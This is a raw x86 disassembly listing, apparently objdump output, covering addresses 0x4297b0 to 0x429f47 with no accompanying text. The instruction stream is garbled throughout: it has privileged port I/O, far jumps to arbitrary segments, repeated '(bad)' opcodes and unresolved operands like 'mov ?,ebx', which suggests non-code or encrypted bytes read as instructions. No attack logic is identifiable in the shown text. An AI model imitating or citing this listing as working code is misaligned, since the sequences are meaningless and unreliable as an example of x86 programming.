  4297b0:	and    DWORD PTR [eax-0x41],esp
  4297b3:	push   ebp
  4297b4:	inc    edi
  4297b5:	xchg   esi,eax
  4297b6:	iret   
  4297b7:	adc    al,0xb6
  4297b9:	ja     0x429783
  4297bb:	hlt    
  4297bc:	cwde   
  4297bd:	test   BYTE PTR [eax],0x32
  4297c0:	lds    eax,FWORD PTR [ebx]
  4297c2:	push   ecx
  4297c3:	out    0x7,eax
  4297c5:	push   esp
  4297c6:	test   al,0x77
  4297c8:	pop    ss
  4297c9:	stc    
  4297ca:	mov    ecx,DWORD PTR [edx]
  4297cc:	sbb    bh,dh
  4297ce:	add    edx,0xababa81c
  4297d4:	sub    eax,esp
  4297d6:	xchg   ecx,eax
  4297d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4297d8:	lock jmp 0xd4bc:0xc199cf0b
  4297e0:	mov    edx,0x465d0f4e
  4297e5:	ror    edi,0xd8
  4297e8:	mov    WORD PTR [ebx+0x45],ss
  4297eb:	and    BYTE PTR [ebx],al
  4297ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4297ee:	sahf   
  4297ef:	add    al,0x62
  4297f1:	pusha  
  4297f2:	(bad)  
  4297f3:	jno    0x4297ca
  4297f5:	int3   
  4297f6:	es inc ebp
  4297f8:	sub    esi,DWORD PTR [edi]
  4297fa:	xor    edi,edx
  4297fc:	pusha  
  4297fd:	aad    0x9e
  4297ff:	jb     0x429857
  429801:	or     eax,0x9c8d2553
  429806:	ja     0x429825
  429808:	push   ecx
  429809:	jb     0x4297dc
  42980b:	xchg   DWORD PTR [esi-0x1bfc8437],esp
  429811:	lahf   
  429812:	add    ebp,DWORD PTR [edi]
  429814:	rol    BYTE PTR [eax+0x48],0x70
  429818:	out    0xaf,eax
  42981a:	push   eax
  42981b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42981c:	lea    ebp,[ebx+0x14]
  42981f:	lock loopne 0x429812
  429822:	shr    al,1
  429824:	lods   al,BYTE PTR ds:[esi]
  429825:	pop    esp
  429826:	loope  0x42982c
  429828:	mov    cl,0xa4
  42982a:	lds    ebp,FWORD PTR [edx+eiz*1+0x6523e2e1]
  429831:	push   ebp
  429832:	pushf  
  429833:	in     al,dx
  429834:	adc    al,0x57
  429836:	cmp    esp,DWORD PTR [edi-0x79b4cfa5]
  42983c:	mov    ebp,es
  42983e:	mov    ds:0xb6455d06,al
  429843:	cld    
  429844:	test   eax,0xa151eba3
  429849:	test   DWORD PTR [ebx],esi
  42984b:	pushf  
  42984c:	loop   0x429879
  42984e:	jne    0x42982c
  429850:	arpl   WORD PTR [eax+ebp*2+0x35],di
  429854:	dec    ebp
  429855:	adc    DWORD PTR [ebx+0x5ba055ed],ecx
  42985b:	mov    ah,0xbc
  42985d:	lods   al,BYTE PTR ds:[esi]
  42985e:	sbb    BYTE PTR [ecx+0x5a4afc80],cl
  429864:	mov    edx,0xf814b26e
  429869:	jl     0x429843
  42986b:	scas   eax,DWORD PTR es:[edi]
  42986c:	adc    BYTE PTR es:[edx-0x5d5cffa5],dl
  429873:	les    esp,FWORD PTR [ebp+0x3724cdf7]
  429879:	jo     0x429815
  42987b:	add    eax,0xefc9aec3
  429880:	dec    ebp
  429881:	mov    edx,0x15674692
  429886:	add    DWORD PTR [edx-0xb],ecx
  429889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42988a:	inc    edx
  42988b:	out    dx,eax
  42988c:	cmc    
  42988d:	dec    esi
  42988e:	ficom  WORD PTR [ecx]
  429890:	dec    ebx
  429891:	adc    DWORD PTR [ebx-0x4e2fbb1c],edi
  429897:	gs int3 
  429899:	mov    ds:0xe393e88b,al
  42989e:	iret   
  42989f:	mov    ebx,0xb96e2b58
  4298a4:	popf   
  4298a5:	mov    ecx,ecx
  4298a7:	aam    0xe7
  4298a9:	rcl    DWORD PTR [esi*2+0xcffb3c4],cl
  4298b0:	cmp    eax,0x1ee6e4ff
  4298b5:	imul   ebx,DWORD PTR [eax+0x6b],0x375fc086
  4298bc:	sbb    BYTE PTR [edi+0x46acb10b],bl
  4298c2:	mov    al,0xe7
  4298c4:	add    edi,DWORD PTR [eax+0x306be797]
  4298ca:	cdq    
  4298cb:	xchg   DWORD PTR [esi-0x3b0b4bf9],ebp
  4298d1:	adc    DWORD PTR [ecx+edi*1],edi
  4298d4:	cdq    
  4298d5:	add    esp,DWORD PTR [esi]
  4298d7:	cmp    cl,BYTE PTR [ebx]
  4298d9:	sub    al,0x92
  4298db:	in     eax,dx
  4298dc:	sbb    bh,BYTE PTR [ecx-0x37]
  4298df:	jnp    0x429903
  4298e1:	div    ecx
  4298e3:	ja     0x42989b
  4298e5:	sahf   
  4298e6:	mov    ecx,DWORD PTR [ebp+0x1792bfe]
  4298ec:	imul   esp,DWORD PTR ds:0x36233dd1,0xffffffb8
  4298f3:	and    al,0xc9
  4298f5:	jecxz  0x42991a
  4298f7:	cs mov ch,0x70
  4298fa:	div    ebp
  4298fc:	ins    BYTE PTR es:[edi],dx
  4298fd:	pop    ds
  4298fe:	pop    esi
  4298ff:	retf   0xc204
  429902:	test   eax,0x98c987b3
  429907:	cld    
  429908:	leave  
  429909:	or     eax,0x2eef3655
  42990e:	mov    esi,0xa31b79e7
  429913:	outs   dx,BYTE PTR ds:[esi]
  429914:	sbb    BYTE PTR [ecx+0x51],bl
  429917:	mov    eax,0x31408628
  42991c:	inc    esi
  42991d:	sbb    esi,esi
  42991f:	add    BYTE PTR [edi+0x56],dh
  429922:	push   eax
  429923:	cdq    
  429924:	jae    0x42990e
  429926:	add    ebx,esi
  429928:	cmc    
  429929:	and    ecx,DWORD PTR [esi+0x5347f7e7]
  42992f:	into   
  429930:	push   ebp
  429931:	mov    DWORD PTR [ecx+0x32],ebp
  429934:	outs   dx,BYTE PTR ds:[esi]
  429935:	mov    bl,BYTE PTR [esi-0x74fe2e3e]
  42993b:	xor    BYTE PTR [edi+ebx*4],0xfb
  42993f:	mov    eax,ds:0x9b32d421
  429944:	jb     0x4299a8
  429946:	and    al,0xf7
  429948:	or     cl,BYTE PTR [eax-0x25a5db4d]
  42994e:	push   0xffffff81
  429950:	gs stc 
  429952:	inc    ebx
  429953:	out    dx,eax
  429954:	jns    0x4298dd
  429956:	or     eax,0xc98922e2
  42995b:	cld    
  42995c:	mov    eax,0xc8a4fd36
  429961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429962:	retf   
  429963:	sbb    eax,0x47d5434a
  429968:	nop
  429969:	ror    DWORD PTR [edx+0x3a0919a7],0xd4
  429970:	mov    ds:0x427a430c,eax
  429975:	mov    DWORD PTR [eax+edx*2-0x3c74ac01],edi
  42997c:	test   DWORD PTR [esi-0x2d],eax
  42997f:	repz jne 0x429985
  429982:	stc    
  429983:	sub    eax,0x14b45c6e
  429988:	call   0x75dc21fc
  42998d:	mov    esp,0x2b42ffa6
  429992:	ins    BYTE PTR es:[edi],dx
  429993:	lahf   
  429994:	retf   
  429995:	sub    esi,DWORD PTR [eax-0x14]
  429998:	sbb    BYTE PTR [esp+ebp*4],bl
  42999b:	adc    eax,0xe8471f65
  4299a0:	sahf   
  4299a1:	sbb    al,0x83
  4299a3:	les    esp,FWORD PTR [ebp+0x24]
  4299a6:	mov    ds:0x3b5265f2,al
  4299ab:	imul   ebp,DWORD PTR [ecx+ecx*1],0xe454aee3
  4299b2:	add    esi,ebx
  4299b4:	in     eax,0x77
  4299b6:	lods   eax,DWORD PTR ds:[esi]
  4299b7:	dec    ebp
  4299b8:	aad    0xe6
  4299ba:	jp     0x4299a5
  4299bc:	xor    al,0xdd
  4299be:	ret    0xb65b
  4299c1:	mov    DWORD PTR [ebx],ebp
  4299c3:	mov    eax,ds:0xe53a1bab
  4299c8:	ret    0x2bcd
  4299cb:	test   DWORD PTR [esi],ebp
  4299cd:	lahf   
  4299ce:	fnstenv [edi]
  4299d0:	push   ecx
  4299d1:	pushf  
  4299d2:	jnp    0x429a28
  4299d4:	shl    DWORD PTR [edi],0x3c
  4299d7:	jle    0x4299f8
  4299d9:	in     al,0xe7
  4299db:	add    ch,ch
  4299dd:	enter  0x64b5,0x2b
  4299e1:	and    DWORD PTR [ebx-0x79],ecx
  4299e4:	push   esi
  4299e5:	nop
  4299e6:	js     0x4299c0
  4299e8:	sbb    eax,0x78cae9f9
  4299ed:	pusha  
  4299ee:	adc    eax,0x95e79ca4
  4299f3:	add    al,0x87
  4299f5:	mov    bh,0xb0
  4299f7:	and    al,0xca
  4299f9:	leave  
  4299fa:	adc    al,0xa
  4299fc:	les    esi,FWORD PTR [edx-0xe4197a5]
  429a02:	fs cs pop esp
  429a05:	out    0x27,eax
  429a07:	dec    ebp
  429a08:	pop    ds
  429a09:	jmp    0x4a55c4cf
  429a0e:	loopne 0x4299ec
  429a10:	stc    
  429a11:	sahf   
  429a12:	fcmovne st,st(6)
  429a14:	jmp    0x429998
  429a16:	push   ds
  429a17:	pop    esp
  429a18:	(bad)  
  429a19:	fidiv  DWORD PTR [edi]
  429a1b:	retf   
  429a1c:	imul   eax,DWORD PTR [edx],0xb7c8a4b8
  429a22:	shl    dl,cl
  429a24:	add    eax,0xb6e82d4b
  429a29:	loopne 0x429a6b
  429a2b:	inc    ebx
  429a2c:	dec    eax
  429a2d:	mov    esp,ebx
  429a2f:	test   DWORD PTR [esi+edi*2],ebp
  429a32:	inc    ebx
  429a33:	scas   eax,DWORD PTR es:[edi]
  429a34:	je     0x429a1c
  429a36:	mov    eax,ds:0xceedd5f2
  429a3b:	cmc    
  429a3c:	sbb    BYTE PTR [ebp+0x8],0x73
  429a40:	xchg   ebx,eax
  429a41:	rcl    BYTE PTR [esi-0x448ed797],0x74
  429a48:	repz dec edi
  429a4a:	xchg   esi,eax
  429a4b:	dec    edi
  429a4c:	inc    ebp
  429a4d:	dec    esi
  429a4e:	adc    esi,esp
  429a50:	xchg   esi,eax
  429a51:	clc    
  429a52:	out    dx,al
  429a53:	xchg   bx,ax
  429a55:	or     ebx,esi
  429a57:	push   0x179d494c
  429a5c:	in     al,dx
  429a5d:	loopne 0x429a17
  429a5f:	fs sub eax,DWORD PTR gs:0x9c18eef3
  429a67:	and    ch,BYTE PTR [ebx]
  429a69:	cdq    
  429a6a:	push   cs
  429a6b:	stc    
  429a6c:	push   ebx
  429a6d:	in     eax,0x4a
  429a6f:	cmp    BYTE PTR [edi-0x694984e9],bl
  429a75:	push   edx
  429a76:	out    0x1d,eax
  429a78:	dec    eax
  429a79:	inc    esi
  429a7a:	xor    dh,0xc8
  429a7d:	jae    0x429a62
  429a7f:	mov    ds:0x6e3f1a52,al
  429a84:	push   ss
  429a85:	sub    DWORD PTR [ebp-0x54],eax
  429a88:	ret    0x55ea
  429a8b:	loopne 0x429a53
  429a8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a8e:	retf   
  429a8f:	mov    eax,0x409885ad
  429a94:	or     cl,BYTE PTR [edi]
  429a96:	stos   DWORD PTR es:[edi],eax
  429a97:	sahf   
  429a98:	mov    al,ds:0x76f4b3e1
  429a9d:	inc    esp
  429a9e:	sub    al,0x9
  429aa0:	adc    eax,0x76e84383
  429aa5:	pop    esi
  429aa6:	out    0x98,al
  429aa8:	sbb    al,0xc9
  429aaa:	push   esp
  429aab:	cli    
  429aac:	inc    eax
  429aad:	mov    bh,BYTE PTR ds:[ebp-0x533f5e9]
  429ab4:	dec    esi
  429ab5:	sbb    eax,DWORD PTR [esi+esi*1-0x1023518a]
  429abc:	fstp   st(6)
  429abe:	dec    esi
  429abf:	push   cs
  429ac0:	ss in  eax,0x8b
  429ac3:	pop    esi
  429ac4:	sbb    edx,DWORD PTR [ebp+edx*1+0x76]
  429ac8:	popf   
  429ac9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429aca:	imul   edi,edi,0xffffffd6
  429acd:	inc    edx
  429ace:	dec    ecx
  429acf:	push   eax
  429ad0:	fsubr  QWORD PTR [ebp-0x1e]
  429ad3:	mov    cl,0xbb
  429ad5:	cmp    BYTE PTR [edi-0x323d30cc],bh
  429adb:	add    al,0xb6
  429add:	and    esp,DWORD PTR [esi]
  429adf:	sbb    bl,BYTE PTR [eax]
  429ae1:	pop    es
  429ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ae3:	xchg   ebp,eax
  429ae4:	fwait
  429ae5:	dec    edx
  429ae6:	mov    esp,0xb80fceb1
  429aeb:	aam    0x75
  429aed:	in     al,0x4
  429aef:	and    edx,esi
  429af1:	xor    al,0x16
  429af3:	pop    edx
  429af4:	and    ah,BYTE PTR [ebp-0x67da68a8]
  429afa:	dec    eax
  429afb:	mov    al,0xd3
  429afd:	or     bh,BYTE PTR [eax-0x4cd93bac]
  429b03:	and    eax,0x10a529a6
  429b08:	loope  0x429aec
  429b0a:	add    cl,bh
  429b0c:	cld    
  429b0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b0e:	mov    esi,0xb847428a
  429b13:	xchg   esp,eax
  429b14:	loopne 0x429b7a
  429b16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429b17:	mov    bl,0x95
  429b19:	stos   DWORD PTR es:[edi],eax
  429b1a:	push   0x6f8f55f2
  429b1f:	mov    WORD PTR [ecx],fs
  429b21:	leave  
  429b22:	mov    eax,DWORD PTR [ebx-0x7e]
  429b25:	gs jmp 0x429abf
  429b28:	adc    al,0x9c
  429b2a:	cmp    ecx,ecx
  429b2c:	(bad)  
  429b2e:	push   edx
  429b2f:	jmp    0x26a6:0xf34e3b01
  429b36:	dec    ecx
  429b37:	jne    0x429b8e
  429b39:	clc    
  429b3a:	push   ss
  429b3b:	out    dx,al
  429b3c:	fs pushf 
  429b3e:	fcmovne st,st(6)
  429b40:	push   cs
  429b41:	sbb    al,0xc2
  429b43:	ins    BYTE PTR es:[edi],dx
  429b44:	mov    edi,DWORD PTR [edi+edx*4]
  429b47:	inc    edx
  429b48:	mov    ebx,0xdd24b612
  429b4d:	sbb    DWORD PTR [ebp-0x1f],ebp
  429b50:	xor    eax,0xa0ef5831
  429b55:	inc    edi
  429b56:	mov    dl,0x33
  429b58:	sbb    al,0xd9
  429b5a:	mov    esi,0x59a40b5f
  429b5f:	fdivr  st(7),st
  429b61:	mov    al,ds:0x4d82d6fb
  429b66:	enter  0x744b,0x9e
  429b6a:	ja     0x429b6a
  429b6c:	out    dx,eax
  429b6d:	cmp    DWORD PTR [edi+0x5c358a24],esi
  429b73:	icebp  
  429b74:	xchg   BYTE PTR [esi+ebx*1],cl
  429b77:	(bad)  
  429b78:	jmp    0x49c1:0x858f6b9e
  429b7f:	and    al,0x7f
  429b81:	shr    DWORD PTR [edi-0x5b],cl
  429b84:	ins    DWORD PTR es:[edi],dx
  429b85:	push   0xffffffdb
  429b87:	in     al,dx
  429b88:	lea    ebp,[eax-0x5354d35]
  429b8e:	mov    cl,0xfb
  429b90:	mov    gs,WORD PTR [edi+ebx*8]
  429b93:	daa    
  429b94:	test   al,0x99
  429b96:	mov    bl,0xa4
  429b98:	or     ch,bh
  429b9a:	les    esi,FWORD PTR [ebx-0x13ccfb5b]
  429ba0:	cmp    ecx,DWORD PTR [ecx+0x791aa2c7]
  429ba6:	mov    DWORD PTR [edi],ecx
  429ba8:	in     al,dx
  429ba9:	cld    
  429baa:	and    ebx,esi
  429bac:	jb     0x429c19
  429bae:	in     eax,dx
  429baf:	frstor [ecx]
  429bb1:	test   al,0xa7
  429bb3:	xor    al,0x99
  429bb5:	adc    DWORD PTR [edx+eax*1+0x3d432922],ecx
  429bbc:	push   ebx
  429bbd:	xchg   edi,eax
  429bbe:	fdiv   DWORD PTR ds:0xfb5b9b4c
  429bc4:	daa    
  429bc5:	cs aaa 
  429bc7:	nop
  429bc8:	jecxz  0x429b70
  429bca:	jne    0x429bdc
  429bcc:	ins    BYTE PTR es:[edi],dx
  429bcd:	mov    DWORD PTR [edi],0x9351ad5
  429bd3:	adc    DWORD PTR [edi-0x50],eax
  429bd6:	inc    edx
  429bd7:	cmp    DWORD PTR ds:0x80e79e01,esi
  429bdd:	mov    esi,0x691f89a0
  429be2:	sbb    DWORD PTR [ebp+esi*8-0x11f3bc74],eax
  429be9:	mov    ds:0xe22459bb,al
  429bee:	rcr    DWORD PTR [edx],cl
  429bf0:	jne    0x429c38
  429bf2:	add    DWORD PTR [esi+0x45a41b60],edi
  429bf8:	pop    ds
  429bf9:	push   ecx
  429bfa:	out    dx,eax
  429bfb:	(bad)
  429bfe:	inc    edi
  429bff:	xor    DWORD PTR [ebp-0x50fbfdc],edx
  429c05:	cmp    al,BYTE PTR [eax+0x4a]
  429c08:	and    al,0x99
  429c0a:	adc    DWORD PTR [edi+ebp*8+0x7f],esi
  429c0e:	data16 (bad) 
  429c10:	jle    0x429bb7
  429c12:	dec    ebx
  429c13:	inc    ecx
  429c14:	adc    BYTE PTR [ebx],0x1e
  429c17:	loopne 0x429bcf
  429c19:	cmp    bh,BYTE PTR [ecx+0x52a94227]
  429c1f:	sar    DWORD PTR [edi+0x2179f96d],cl
  429c25:	cwde   
  429c26:	dec    esi
  429c27:	repnz pop es
  429c29:	push   0x85e5c87a
  429c2e:	vminps ymm2,ymm3,YMMWORD PTR [eax+edi*2-0x1a53ba1b]
  429c37:	test   bh,cl
  429c39:	mov    eax,ds:0x2ed138f5
  429c3e:	out    dx,eax
  429c3f:	test   BYTE PTR [esi],dl
  429c41:	xor    DWORD PTR [ecx+edx*1],edi
  429c44:	(bad)  
  429c45:	cdq    
  429c46:	lods   al,BYTE PTR ds:[esi]
  429c47:	mov    ebx,DWORD PTR [edx]
  429c49:	imul   esp,DWORD PTR [ecx],0xa7207bbb
  429c4f:	ins    DWORD PTR es:[edi],dx
  429c50:	or     eax,0xfe284ba8
  429c55:	lds    esi,FWORD PTR [ebp+edi*2+0x34]
  429c59:	mul    BYTE PTR [ebx+0x35e92569]
  429c5f:	jl     0x429c84
  429c61:	sbb    eax,0xe723e1b1
  429c66:	mov    cl,ah
  429c68:	xchg   ebp,eax
  429c69:	cmp    esi,edi
  429c6b:	lock (bad) 
  429c6d:	out    dx,eax
  429c6e:	out    0xff,al
  429c70:	out    dx,al
  429c71:	sub    bh,BYTE PTR [ecx+0x455d1a95]
  429c77:	mov    eax,ds:0x629ed730
  429c7c:	cmc    
  429c7d:	ja     0x429c89
  429c7f:	out    dx,al
  429c80:	jp     0x429ca3
  429c82:	jmp    0xff8bc285
  429c87:	and    edx,DWORD PTR [edi]
  429c89:	loopne 0x429cc3
  429c8b:	xlat   BYTE PTR ds:[ebx]
  429c8c:	mov    al,0x8a
  429c8e:	dec    ebp
  429c8f:	jne    0x429c39
  429c91:	and    eax,0x5e0af7bb
  429c96:	mov    edi,0x35687a74
  429c9b:	shr    ebx,1
  429c9d:	je     0x429c25
  429c9f:	push   ss
  429ca0:	push   esp
  429ca1:	dec    esp
  429ca2:	mov    esi,0x1ba5deec
  429ca7:	or     BYTE PTR [edx],ah
  429ca9:	aaa    
  429caa:	test   BYTE PTR [ecx],dl
  429cac:	repnz (bad) 
  429cae:	je     0x429cf9
  429cb0:	mov    esi,0xaac4b51c
  429cb5:	int3   
  429cb6:	sub    al,0x19
  429cb8:	aad    0x96
  429cba:	jl     0x429ca4
  429cbc:	add    dl,BYTE PTR [eax]
  429cbe:	pop    ss
  429cbf:	out    0x17,al
  429cc1:	pop    ecx
  429cc2:	adc    esp,ebp
  429cc4:	mov    al,ds:0xaaeb7539
  429cc9:	rcr    DWORD PTR [ebx+0x48],1
  429ccc:	rol    ecx,1
  429cce:	gs cmc 
  429cd0:	sbb    DWORD PTR [ecx-0x54a8f8cf],esi
  429cd6:	mov    ch,0x16
  429cd8:	adc    bl,bl
  429cda:	stc    
  429cdb:	shl    dl,1
  429cdd:	lds    edi,FWORD PTR [ebp+0x75]
  429ce0:	(bad)  
  429ce1:	outs   dx,BYTE PTR ds:[esi]
  429ce2:	dec    ecx
  429ce3:	pop    ss
  429ce4:	and    ebp,ebx
  429ce6:	int    0xcd
  429ce8:	pop    ebx
  429ce9:	enter  0xc236,0xb5
  429ced:	call   0xe4a601ae
  429cf2:	mov    esi,0xac13c479
  429cf7:	jb     0x429cef
  429cf9:	inc    ecx
  429cfa:	mov    dh,BYTE PTR [ecx+0x30]
  429cfd:	push   ss
  429cfe:	sub    al,0xf3
  429d00:	pop    es
  429d01:	popa   
  429d02:	mov    ebx,0xb5d91bce
  429d07:	call   DWORD PTR [ecx]
  429d09:	ins    BYTE PTR es:[edi],dx
  429d0a:	pop    edi
  429d0b:	push   eax
  429d0c:	dec    ecx
  429d0d:	push   0x27755adb
  429d12:	aas    
  429d13:	in     eax,dx
  429d14:	cmp    BYTE PTR [esi],dl
  429d16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429d17:	sbb    BYTE PTR [eax],ch
  429d19:	mov    esp,edx
  429d1b:	js     0x429d53
  429d1d:	xchg   esp,eax
  429d1e:	push   ebp
  429d1f:	sti    
  429d20:	fstp   TBYTE PTR [eax]
  429d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d23:	bound  esi,QWORD PTR [ebp+0x32]
  429d26:	xchg   ch,ch
  429d28:	push   ecx
  429d29:	stos   DWORD PTR es:[edi],eax
  429d2a:	mov    ?,ebx
  429d2c:	mov    ecx,?
  429d2e:	imul   esp,DWORD PTR ds:0x69af2838,0x65
  429d35:	mov    esi,0x8a0a91b6
  429d3a:	ja     0x429d2b
  429d3c:	adc    eax,0x18ef8378
  429d41:	push   0x31
  429d43:	xor    al,0x24
  429d45:	mov    ecx,ecx
  429d47:	enter  0x58b8,0xd9
  429d4b:	cmp    BYTE PTR [ecx-0x1b6795d5],dl
  429d51:	sahf   
  429d52:	mov    ebx,0x8355ab80
  429d57:	add    BYTE PTR [edx+0x1b4787b6],ch
  429d5d:	jecxz  0x429d16
  429d5f:	je     0x429da7
  429d61:	xchg   edx,eax
  429d62:	(bad)  
  429d63:	mov    edi,0xed2c2685
  429d68:	cmp    ebp,edi
  429d6a:	adc    al,BYTE PTR [eax-0x2cc226db]
  429d70:	jl     0x429dde
  429d72:	sub    BYTE PTR [esp+ebp*8-0x67],0xdb
  429d77:	rcl    BYTE PTR [ecx-0x5a],0xd0
  429d7b:	ins    BYTE PTR es:[edi],dx
  429d7c:	(bad)  
  429d7d:	add    DWORD PTR [eax],esp
  429d7f:	cmp    al,0xee
  429d81:	fwait
  429d82:	stos   DWORD PTR es:[edi],eax
  429d83:	sbb    BYTE PTR [esi-0x7b],ch
  429d86:	ja     0x429dca
  429d88:	frstor [ebx+ebp*2-0x2a772a2a]
  429d8f:	imul   esi,DWORD PTR [eax-0x5d],0x7c
  429d93:	inc    edi
  429d94:	ja     0x429d83
  429d96:	xchg   esp,eax
  429d97:	add    eax,0xa22b15f8
  429d9c:	sahf   
  429d9d:	jp     0x429d5d
  429d9f:	inc    esp
  429da0:	and    cl,cl
  429da2:	cmp    DWORD PTR [edx],esi
  429da4:	(bad)  
  429da5:	jmp    0xb42983d7
  429daa:	or     ecx,ebx
  429dac:	test   BYTE PTR [esi-0x41],dl
  429daf:	mov    DWORD PTR [esi-0x3687b15a],ebp
  429db5:	loopne 0x429e17
  429db7:	pusha  
  429db8:	and    al,0x59
  429dba:	sar    ebx,0x20
  429dbd:	repnz mov eax,esi
  429dc0:	xlat   BYTE PTR ds:[ebx]
  429dc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429dc2:	dec    ebx
  429dc3:	stos   BYTE PTR es:[edi],al
  429dc4:	adc    BYTE PTR [edx-0x620ac512],ah
  429dca:	mov    edx,0xc0f92216
  429dcf:	imul   esi,DWORD PTR ds:0x2386f4e2,0x61
  429dd6:	mov    cl,0x29
  429dd8:	sbb    BYTE PTR [ecx+0x5bca1ab1],bh
  429dde:	mov    bh,dl
  429de0:	or     ebp,ebx
  429de2:	jmp    0xcd557d09
  429de7:	mov    esi,0x98b6c167
  429dec:	sub    edi,DWORD PTR [edi+ebp*2]
  429def:	sub    DWORD PTR [ebx],ebp
  429df1:	cmp    ebp,edi
  429df3:	push   cs
  429df4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429df5:	scas   eax,DWORD PTR es:[edi]
  429df6:	test   dl,cl
  429df8:	loope  0x429d88
  429dfa:	js     0x429de2
  429dfc:	(bad)  
  429dfd:	fistp  QWORD PTR [ebx-0x323e6c9c]
  429e03:	ret    
  429e04:	addr16 dec eax
  429e06:	fwait
  429e07:	arpl   WORD PTR [esi-0x73a9c29f],sp
  429e0d:	mov    dl,BYTE PTR [ebx+0x3c5921ed]
  429e13:	inc    ecx
  429e14:	pusha  
  429e15:	fwait
  429e16:	sbb    ah,bh
  429e18:	add    eax,0x5b0b3ba5
  429e1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e1e:	nop
  429e1f:	into   
  429e20:	call   0xb5e6:0xcde45cc1
  429e27:	xor    al,0x22
  429e29:	cmc    
  429e2a:	lea    eax,[esi]
  429e2c:	xchg   ebp,eax
  429e2d:	out    dx,eax
  429e2e:	add    al,0xe5
  429e30:	rcr    DWORD PTR [eax+ecx*8],1
  429e33:	mov    bl,BYTE PTR ds:0xe3ae72a9
  429e39:	sub    al,0x8a
  429e3b:	cwde   
  429e3c:	mov    edx,0xe0006d68
  429e41:	mov    ah,0xe3
  429e43:	retf   
  429e44:	and    esp,DWORD PTR [edi]
  429e46:	adc    dl,BYTE PTR [esi]
  429e48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e49:	jp     0x429e8e
  429e4b:	out    0xae,al
  429e4d:	push   ecx
  429e4e:	popf   
  429e4f:	push   ebp
  429e50:	xchg   ecx,eax
  429e51:	mov    edx,0x630feb62
  429e56:	ins    BYTE PTR es:[edi],dx
  429e57:	sub    al,0xbe
  429e59:	ds addr16 mov bh,0xcd
  429e5d:	push   ds
  429e5e:	pop    ss
  429e5f:	cmp    DWORD PTR [edi],esp
  429e61:	leave  
  429e62:	mov    ebx,0x25863b2e
  429e67:	cmp    al,0x1f
  429e69:	cmp    DWORD PTR [esi+ebp*2-0x7c],esi
  429e6d:	out    0x9a,al
  429e6f:	sbb    BYTE PTR [ecx+eiz*1],dh
  429e72:	cmc    
  429e73:	adc    BYTE PTR ds:0x4e09ac39,0xce
  429e7a:	inc    esi
  429e7b:	(bad)  
  429e7c:	gs ins DWORD PTR es:[edi],dx
  429e7e:	mov    ebp,0x799917e4
  429e83:	cmp    bh,BYTE PTR [eax+0x6d5a4805]
  429e89:	lahf   
  429e8a:	sub    edx,DWORD PTR [ebx-0x70]
  429e8d:	dec    ecx
  429e8e:	mov    al,ds:0x5b33ae70
  429e93:	jbe    0x429e77
  429e95:	adc    al,0xb0
  429e97:	in     al,0x61
  429e99:	cmp    esp,ebx
  429e9b:	xchg   ebp,eax
  429e9c:	cmc    
  429e9d:	cwde   
  429e9e:	and    eax,0x187b28f1
  429ea3:	shl    DWORD PTR [ebx],1
  429ea5:	imul   ebx,DWORD PTR [eax-0x60],0xf6ee4e76
  429eac:	mov    ch,0xa1
  429eae:	fcmovnu st,st(1)
  429eb0:	mov    ah,0x20
  429eb2:	lods   al,BYTE PTR ds:[esi]
  429eb3:	jg     0x429f2a
  429eb5:	push   ecx
  429eb6:	int3   
  429eb7:	dec    edi
  429eb8:	pop    ebp
  429eb9:	shl    BYTE PTR [esi-0x4764ea9c],1
  429ebf:	xor    ebx,DWORD PTR [ebp-0x3a9f6273]
  429ec5:	call   0x1cbe:0x13f03c5b
  429ecc:	sub    cl,BYTE PTR [ecx-0x17]
  429ecf:	je     0x429f37
  429ed1:	mov    ah,0x78
  429ed3:	(bad)  
  429ed4:	enter  0x4726,0xb2
  429ed8:	xchg   esi,eax
  429ed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429eda:	retf   
  429edb:	pop    ecx
  429edc:	inc    edx
  429edd:	pop    ebp
  429ede:	jmp    0x429f40
  429ee0:	cmp    al,0x68
  429ee2:	sub    BYTE PTR [eax+0x2e],ah
  429ee5:	and    DWORD PTR [edi-0x674a31dc],edi
  429eeb:	cwde   
  429eec:	xchg   BYTE PTR [ebx+0x61b41842],ch
  429ef2:	(bad)
  429ef6:	inc    edi
  429ef7:	xor    al,0x18
  429ef9:	fldcw  WORD PTR [edx-0x6c]
  429efc:	mov    es,ax
  429eff:	daa    
  429f00:	outs   dx,DWORD PTR ds:[esi]
  429f01:	cdq    
  429f02:	pop    ebx
  429f03:	pop    ebp
  429f04:	jp     0x429f00
  429f06:	fimul  WORD PTR [edx+eax*8+0x7c]
  429f0a:	mov    dh,0x70
  429f0c:	push   ebx
  429f0d:	adc    edi,DWORD PTR [edx-0x5e012c7c]
  429f13:	fild   WORD PTR [esi+0x69]
  429f16:	mov    cl,0x43
  429f18:	test   DWORD PTR [edi-0x54acbc59],esi
  429f1e:	mov    dl,0x6e
  429f20:	fs or  ebx,edx
  429f23:	lods   al,BYTE PTR ds:[esi]
  429f24:	push   es
  429f25:	lahf   
  429f26:	stos   DWORD PTR es:[edi],eax
  429f27:	clc    
  429f28:	push   edi
  429f29:	mov    cl,0xaf
  429f2b:	je     0x429f98
  429f2d:	inc    esp
  429f2e:	das    
  429f2f:	call   0xd117:0xeaec8ccb
  429f36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429f37:	mov    eax,0xa25ee217
  429f3c:	sbb    DWORD PTR [ecx-0x31],ebp
  429f3f:	or     ah,BYTE PTR [esi+0x57]
  429f42:	dec    esp
  429f43:	push   esi
  429f44:	scas   eax,DWORD PTR es:[edi]
  429f45:	popa   
  429f46:	std    
  429f47:	dec    ebx
